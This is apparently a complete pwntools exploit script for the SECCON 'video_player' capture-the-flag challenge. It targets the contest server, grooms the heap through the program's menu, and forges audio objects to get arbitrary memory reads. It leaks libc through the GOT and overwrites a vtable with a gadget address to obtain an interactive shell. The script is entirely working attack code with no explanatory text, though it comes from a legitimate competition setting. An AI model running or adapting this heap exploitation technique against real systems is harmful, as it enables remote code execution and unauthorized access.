from pwn import *
import time

video_size = 0x50
audio_size = 0x48
sub_size = 0x18
meta_size = 0x48

audio_vt = 0x0000000000402938

# p = process('./video')
p = remote('video_player.pwn.seccon.jp', 7777)
p.recvuntil('?\n')
p.sendline('\x00' * 0xff)

def menu():
    p.recvuntil('>>> ')

def add_video(reso, fps, num, data, des):
    menu()
    p.sendline('1')

    menu()
    p.sendline('1')

    p.recvuntil(' : ')
    p.send(p64(reso))

    p.recvuntil(' : ')
    p.send(p32(fps))

    p.recvuntil(' : ')
    p.send(p32(num))

    p.recvuntil(' : ')
    p.send(data)

    p.recvuntil(' : ')
    p.send(des)

def edit_video(index, reso, fps, num, data, des):
    menu()
    p.sendline('2')

    p.recvuntil(' : ')
    p.sendline(str(index))

    p.recvuntil(' : ')
    p.send(p64(reso))

    p.recvuntil(' : ')
    p.send(p32(fps))

    p.recvuntil(' : ')
    p.send(p32(num))

    p.recvuntil(' : ')
    p.send(data)

    p.recvuntil(' : ')
    p.send(des)

def add_audio(rate, length, data, des):
    menu()
    p.sendline('1')

    menu()
    p.sendline('2')

    p.recvuntil(' : ')
    p.send(rate)

    p.recvuntil(' : ')
    p.send(p32(length))

    p.recvuntil(' : ')
    p.send(data)

    p.recvuntil(' : ')
    p.send(des)

def del_clip(index):
    menu()
    p.sendline('4')

    p.recvuntil(' : ')
    p.sendline(str(index))

def add_sub(lang, length, sub):
    menu()
    p.sendline('1')

    menu()
    p.sendline('3')

    p.recvuntil(' : ')
    p.send(p32(lang))

    p.recvuntil(' : ')
    p.send(p32(length))

    p.recvuntil(' : ')
    p.send(sub)

def add_meta(creation, owner):
    menu()
    p.sendline('1')

    menu()
    p.sendline('4')

    p.recvuntil(' : ')
    p.send(creation)

    p.recvuntil(' : ')
    p.send(owner)

def edit_meta(index, creation, owner):
    menu()
    p.sendline('2')

    p.recvuntil(' : ')
    p.sendline(str(index))

    p.recvuntil(' : ')
    p.send(creation)

    p.recvuntil(' : ')
    p.send(owner)

def read8(addr, idx):
    ret = 0
    t = 0
    for x in xrange(addr, addr + 8):
        fake_audio = p64(audio_vt)
        fake_audio += p32(0)
        fake_audio += p32(0x0)
        fake_audio += p64(x)
        fake_audio = fake_audio.ljust(audio_size, 'A')
        add_sub(0x0, audio_size, fake_audio)
        time.sleep(0.2)

        menu()
        p.sendline('3')
        p.recvuntil(' : ')
        p.sendline('5')
        leak = int(p.recvline()) ^ 0x55
        ret += leak * (0x100 ** t)

        del_clip(idx)
        idx += 1
        t += 1

    return ret


add_video(0x0, 0x0, audio_size, 'A' * audio_size, 'B' * 0x2f) # 0
time.sleep(0.2)
add_video(0x0, 0x0, audio_size, 'A' * audio_size, 'B' * 0x2f) # 1
time.sleep(0.2)
add_video(0x0, 0x0, audio_size, 'A' * audio_size, 'B' * 0x2f) # 2
time.sleep(0.2)
add_video(0x0, 0x0, audio_size, 'A' * audio_size, 'B' * 0x2f) # 3
time.sleep(0.2)
add_video(0x0, 0x0, audio_size, 'A' * audio_size, 'B' * 0x2f) # 4
time.sleep(0.2)

edit_video(2, 0x0, 0x0, audio_size, 'A' * audio_size, 'B' * 0x2f)
time.sleep(0.2)

add_audio('\x00\x00', 0x10, 'A' * 0x10, 'B' * 0x2f) # 5
time.sleep(0.2)

del_clip(2)

read_got = 0x604050
'''
read_got = 0x604050
fake_audio = p64(audio_vt)
fake_audio += p32(0)
fake_audio += p32(0x8)
fake_audio += p64(read_got)
fake_audio += 'A' * 0x30
assert(len(fake_audio) == audio_size)
'''
read_addr = read8(read_got, 6)
libc_base = read_addr - 0xf7220
system = libc_base + 0xf1117
print hex(read_addr)

fake_vt = p64(system) * 4 + 'B' * 0xf
add_video(0x0, 0x0, 0x10, 'A' * 0x10, fake_vt) # 14
time.sleep(0.2)

fake_vt_addr = read8(0x604470, 15) + 0x20
print hex(fake_vt_addr)

fake_audio = p64(fake_vt_addr)
fake_audio = fake_audio.ljust(audio_size, 'A')
add_sub(0x0, audio_size, fake_audio) 
time.sleep(0.2)

del_clip(5)

# add_meta('A' * 0x1f, 'B' * 0x1f) # 6
# read8(read_got)

# read8(read_got)

p.interactive()
